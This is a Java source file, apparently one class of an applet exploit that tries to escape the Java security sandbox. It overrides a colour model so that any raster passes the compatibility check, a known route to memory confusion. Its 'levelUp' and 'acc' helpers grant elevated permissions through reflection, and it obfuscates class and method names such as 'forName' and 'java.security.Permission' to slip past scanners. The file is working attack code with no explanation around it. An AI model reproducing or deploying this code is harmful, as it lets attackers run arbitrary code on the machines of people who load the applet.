import java.awt.image.ComponentColorModel;
import java.awt.image.Raster;
import java.beans.Expression;
import java.lang.reflect.Method;
import java.security.AccessControlContext;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;

public class info2
        extends ComponentColorModel {
    public info2() {
        super(new info1(), new int[] { 8, 8, 8 }, false, false, 1, 0);
    }

    public boolean isCompatibleRaster(Raster paramRaster) {
        return true;
    }

    public static SecurityManager getSM() {
        return System.getSecurityManager();
    }

    public static AccessControlContext acc(Object paramObject) {
        return new AccessControlContext(new ProtectionDomain[] { new ProtectionDomain(
                new CodeSource(null, new java.security.cert.Certificate[0]), (Permissions) paramObject) });
    }

    public static Object levelUp(String paramString1, String paramString2) throws Exception {
        Class clazz = getCl(paramString1);
        Object object = getCl(paramString2).newInstance();
        // a java.security.Permission
        Method method = object.getClass().getMethod(Issue.csfn("777a7777") + "dd",
                new Class[] { getCl(Issue.csfn("77j7a7v7a7.7s7e7c7u7r7i7t8y.8P8e48r8m8i8s8s8i8o8n8")) });
        method.invoke(object, new Object[] { clazz.newInstance() });
        return object;
    }

    static Class getCl(String paramString) throws Exception {
        // forNa me
        String str1 = "8f28o8r8N8a888883", str2 = "8888888888m3e";
        Expression expression = new Expression(Class.class, Issue.csfn(str1 + str2), new Object[] { paramString });
        try {
            expression.execute();
        } catch (Exception exception) {
        }
        return (Class) expression.getValue();
    }

    static Object pInvoke(Method paramMethod, Object paramObject, Object[] paramArrayOfObject) throws Exception {
        return paramMethod.invoke(paramObject, paramArrayOfObject);
    }
}
